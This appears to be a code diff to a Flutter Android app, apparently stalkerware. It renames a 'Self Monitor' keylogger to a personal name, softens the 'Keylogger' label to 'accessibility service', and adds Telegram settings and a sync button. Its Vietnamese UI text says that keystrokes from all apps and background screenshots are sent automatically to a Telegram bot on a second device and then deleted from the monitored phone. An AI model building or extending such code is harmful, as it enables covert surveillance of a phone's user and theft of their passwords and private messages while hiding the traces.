@@ -4,6 +4,8 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'db_helper.dart';
 import 'monitor_service.dart';
+import 'telegram_settings_screen.dart';
+import 'login_screen.dart';
 
 void main() {
   runApp(const SelfMonitorApp());
@@ -15,13 +17,13 @@ class SelfMonitorApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'Self Monitor',
+      title: 'Phương Uyên',
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
-        colorSchemeSeed: Colors.indigo,
+        colorSchemeSeed: Colors.pink,
         useMaterial3: true,
       ),
-      home: const HomeScreen(),
+      home: const LoginScreen(),
     );
   }
 }
@@ -37,6 +39,8 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   bool _accessibilityEnabled = false;
   bool _screenshotServiceRunning = false;
   bool _batteryOptIgnored = false;
+  bool _telegramConfigured = false;
+  bool _telegramEnabled = false;
   int _intervalSeconds = 15;
   bool _checking = true;
 
@@ -65,12 +69,18 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
     final accEnabled = await MonitorService.isAccessibilityServiceEnabled();
     final screenshotRunning = await MonitorService.isScreenshotServiceRunning();
     final batteryIgnored = await MonitorService.isIgnoringBatteryOptimizations();
+    final tgConfig = await MonitorService.getTelegramConfig();
+    final tgToken = (tgConfig['botToken'] as String? ?? '').trim();
+    final tgChatId = (tgConfig['chatId'] as String? ?? '').trim();
+    final tgEnabled = tgConfig['enabled'] as bool? ?? false;
 
     if (mounted) {
       setState(() {
         _accessibilityEnabled = accEnabled;
         _screenshotServiceRunning = screenshotRunning;
         _batteryOptIgnored = batteryIgnored;
+        _telegramConfigured = tgToken.isNotEmpty && tgChatId.isNotEmpty;
+        _telegramEnabled = tgEnabled;
         _checking = false;
       });
     }
@@ -142,9 +152,29 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
         title: const Text('Self Monitor'),
         actions: [
           IconButton(
+            icon: const Icon(Icons.settings),
+            tooltip: 'Cài đặt Telegram',
+            onPressed: () async {
+              await Navigator.of(context).push(
+                MaterialPageRoute(
+                    builder: (_) => const TelegramSettingsScreen()),
+              );
+              _refreshStatus();
+            },
+          ),
+          IconButton(
             icon: const Icon(Icons.refresh),
             tooltip: 'Làm mới trạng thái',
             onPressed: _refreshStatus,
+          ),
+          IconButton(
+            icon: const Icon(Icons.logout_rounded),
+            tooltip: 'Đăng xuất',
+            onPressed: () {
+              Navigator.of(context).pushReplacement(
+                MaterialPageRoute(builder: (_) => const LoginScreen()),
+              );
+            },
           ),
         ],
       ),
@@ -182,6 +212,107 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                       ),
                     ),
 
+                  // Card Telegram Máy 2
+                  Card(
+                    elevation: 1,
+                    color: _telegramConfigured && _telegramEnabled
+                        ? Colors.indigo.shade50
+                        : Colors.blueGrey.shade50,
+                    shape: RoundedRectangleBorder(
+                      borderRadius: BorderRadius.circular(12),
+                      side: BorderSide(
+                        color: _telegramConfigured && _telegramEnabled
+                            ? Colors.indigo.shade300
+                            : Colors.blueGrey.shade200,
+                      ),
+                    ),
+                    child: Padding(
+                      padding: const EdgeInsets.all(16),
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Row(
+                            children: [
+                              Icon(
+                                _telegramConfigured && _telegramEnabled
+                                    ? Icons.telegram
+                                    : Icons.send_and_archive_outlined,
+                                color: _telegramConfigured && _telegramEnabled
+                                    ? Colors.indigo
+                                    : Colors.blueGrey.shade700,
+                                size: 26,
+                              ),
+                              const SizedBox(width: 8),
+                              const Expanded(
+                                child: Text(
+                                  'Gửi dữ liệu về Telegram Máy 2',
+                                  style: TextStyle(
+                                      fontSize: 16,
+                                      fontWeight: FontWeight.bold),
+                                ),
+                              ),
+                              Container(
+                                padding: const EdgeInsets.symmetric(
+                                    horizontal: 8, vertical: 3),
+                                decoration: BoxDecoration(
+                                  color: _telegramConfigured
+                                      ? (_telegramEnabled
+                                          ? Colors.green.shade100
+                                          : Colors.amber.shade100)
+                                      : Colors.grey.shade200,
+                                  borderRadius: BorderRadius.circular(12),
+                                ),
+                                child: Text(
+                                  _telegramConfigured
+                                      ? (_telegramEnabled
+                                          ? 'Đang gửi tự động'
+                                          : 'Đang tạm dừng')
+                                      : 'Chưa nhập Token',
+                                  style: TextStyle(
+                                    fontSize: 11,
+                                    fontWeight: FontWeight.bold,
+                                    color: _telegramConfigured
+                                        ? (_telegramEnabled
+                                            ? Colors.green.shade800
+                                            : Colors.amber.shade900)
+                                        : Colors.grey.shade700,
+                                  ),
+                                ),
+                              ),
+                            ],
+                          ),
+                          const SizedBox(height: 8),
+                          Text(
+                            _telegramConfigured
+                                ? 'Ảnh chụp màn hình và phím gõ sẽ tự động gửi về Telegram Máy 2. Dữ liệu trên Máy 1 được tự động xoá ngay sau khi gửi thành công để không tốn bộ nhớ.'
+                                : 'Bạn tự nhập Bot Token và Chat ID trực tiếp vào ứng dụng này. Dữ liệu lưu cục bộ và bảo mật 100%.',
+                            style: TextStyle(
+                                color: Colors.grey.shade800, fontSize: 13),
+                          ),
+                          const SizedBox(height: 12),
+                          SizedBox(
+                            width: double.infinity,
+                            child: FilledButton.icon(
+                              onPressed: () async {
+                                await Navigator.of(context).push(
+                                  MaterialPageRoute(
+                                      builder: (_) =>
+                                          const TelegramSettingsScreen()),
+                                );
+                                _refreshStatus();
+                              },
+                              icon: const Icon(Icons.settings),
+                              label: Text(_telegramConfigured
+                                  ? 'Cài đặt & Quản lý Telegram'
+                                  : 'Nhập Bot Token & Chat ID ngay'),
+                            ),
+                          ),
+                        ],
+                      ),
+                    ),
+                  ),
+                  const SizedBox(height: 16),
+
                   // Card 1: Chạy ngầm liên tục
                   _buildStatusCard(
                     title: 'Chạy ngầm liên tục (Không bị hệ thống tắt)',
@@ -196,16 +327,16 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                   ),
                   const SizedBox(height: 16),
 
-                  // Card 2: Accessibility ghi phím
+                  // Card 2: Accessibility ghi phím & Chụp ảnh tự động
                   _buildStatusCard(
-                    title: 'Ghi lại thao tác nhập liệu (Keylogger)',
+                    title: 'Dịch vụ Trợ năng (Ghi phím & Chụp ảnh tự động)',
                     subtitle:
-                        'Sử dụng Accessibility Service để tự động ghi lại toàn bộ thao tác gõ phím trên tất cả các app khác vào SQLite local.',
+                        'Khi bật Trợ năng (Accessibility), app sẽ TỰ ĐỘNG ghi lại thao tác gõ phím VÀ TỰ ĐỘNG chụp màn hình định kỳ trong nền (Android 11+). Toàn bộ dữ liệu tự gửi lên Telegram.',
                     enabled: _accessibilityEnabled,
                     onToggle: _toggleAccessibility,
                     toggleLabel: _accessibilityEnabled
-                        ? 'Mở cài đặt Accessibility'
-                        : 'Cấp quyền Accessibility',
+                        ? 'Đã bật Trợ năng (Đang chạy tự động)'
+                        : 'Cấp quyền Trợ năng (Accessibility)',
                     trailingAction: TextButton.icon(
                       onPressed: _showAndroid13Guide,
                       icon: const Icon(Icons.help_outline, size: 16),
@@ -214,7 +345,7 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                   ),
                   const SizedBox(height: 16),
 
-                  // Card 3: Chụp màn hình định kỳ
+                  // Card 3: Chụp màn hình nâng cao (MediaProjection)
                   Card(
                     elevation: 1,
                     child: Padding(
@@ -235,7 +366,7 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                               const SizedBox(width: 8),
                               const Expanded(
                                 child: Text(
-                                  'Chụp màn hình định kỳ',
+                                  'Chụp màn hình Foreground (MediaProjection)',
                                   style: TextStyle(
                                       fontSize: 16,
                                       fontWeight: FontWeight.bold),
@@ -245,7 +376,7 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                           ),
                           const SizedBox(height: 8),
                           Text(
-                            'Chạy Foreground Service tự động chụp màn hình nền và lưu ảnh JPG. Dịch vụ vẫn tiếp tục chạy khi bạn đóng hoặc vuốt tắt app.',
+                            'Chạy Foreground Service chụp màn hình chất lượng cao. Ảnh sau khi chụp sẽ tự động gửi qua Telegram và xoá ngay trên Máy 1 để nhẹ máy.',
                             style: TextStyle(color: Colors.grey[700]),
                           ),
                           const SizedBox(height: 12),
@@ -428,14 +559,20 @@ class _TimelineScreenState extends State<TimelineScreen> {
     if (!silent) {
       setState(() => _isLoading = true);
     }
-    final texts = await DbHelper.instance.getTextLogs();
-    final shots = await DbHelper.instance.getScreenshots();
-    if (mounted) {
-      setState(() {
-        _textLogs = texts;
-        _screenshots = shots;
-        _isLoading = false;
-      });
+    try {
+      final texts = await DbHelper.instance.getTextLogs();
+      final shots = await DbHelper.instance.getScreenshots();
+      if (mounted) {
+        setState(() {
+          _textLogs = texts;
+          _screenshots = shots;
+          _isLoading = false;
+        });
+      }
+    } catch (_) {
+      if (mounted) {
+        setState(() => _isLoading = false);
+      }
     }
   }
 
@@ -498,6 +635,53 @@ class _TimelineScreenState extends State<TimelineScreen> {
         appBar: AppBar(
           title: const Text('Lịch sử đã ghi'),
           actions: [
+            IconButton(
+              icon: const Icon(Icons.cloud_upload_outlined),
+              tooltip: 'Gửi bù lên Telegram',
+              onPressed: () async {
+                ScaffoldMessenger.of(context).showSnackBar(
+                  const SnackBar(
+                    content: Text('Đang gửi bù dữ liệu lên Telegram...'),
+                    duration: Duration(seconds: 1),
+                  ),
+                );
+                final res = await MonitorService.syncTelegramNow();
+                _load(silent: true);
+                if (context.mounted) {
+                  final sentP = res['sentPhotos'] ?? 0;
+                  final sentT = res['sentTexts'] ?? 0;
+                  final err = res['error'] as String? ?? '';
+                  if (err.isNotEmpty && sentP == 0 && sentT == 0) {
+                    ScaffoldMessenger.of(context).showSnackBar(
+                      SnackBar(
+                        content: Text('Lỗi gửi: $err'),
+                        backgroundColor: Colors.red,
+                      ),
+                    );
+                  } else {
+                    ScaffoldMessenger.of(context).showSnackBar(
+                      SnackBar(
+                        content: Text(
+                          'Đã gửi $sentP ảnh và $sentT text lên Telegram, dọn sạch bộ nhớ Máy 1.',
+                        ),
+                        backgroundColor: Colors.green,
+                      ),
+                    );
+                  }
+                }
+              },
+            ),
+            IconButton(
+              icon: const Icon(Icons.settings_outlined),
+              tooltip: 'Cài đặt Telegram',
+              onPressed: () async {
+                await Navigator.of(context).push(
+                  MaterialPageRoute(
+                      builder: (_) => const TelegramSettingsScreen()),
+                );
+                _load(silent: true);
+              },
+            ),
             IconButton(
               icon: const Icon(Icons.refresh),
               tooltip: 'Làm mới',
@@ -682,6 +866,7 @@ class _TimelineScreenState extends State<TimelineScreen> {
                                   child: file.existsSync()
                                       ? Image.file(
                                           file,
+                                          cacheWidth: 300,
                                           fit: BoxFit.cover,
                                           errorBuilder: (c, e, s) =>
                                               Container(
